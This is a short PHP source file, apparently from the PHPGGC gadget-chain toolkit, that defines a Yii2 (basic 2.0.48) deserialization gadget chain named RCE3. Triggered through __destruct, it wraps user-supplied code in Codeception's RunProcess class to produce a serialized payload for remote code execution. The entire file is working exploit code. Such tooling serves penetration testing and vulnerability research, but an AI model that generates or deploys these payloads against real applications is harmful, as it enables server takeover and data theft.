<?php

namespace GadgetChain\Yii2;

class RCE3 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = 'yii-app-basie 2.0.48';
    public static $vector = '__destruct';
    public static $author = 'AFKL';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];
        return new \Codeception\Extension\RunProcess($code);
    }
}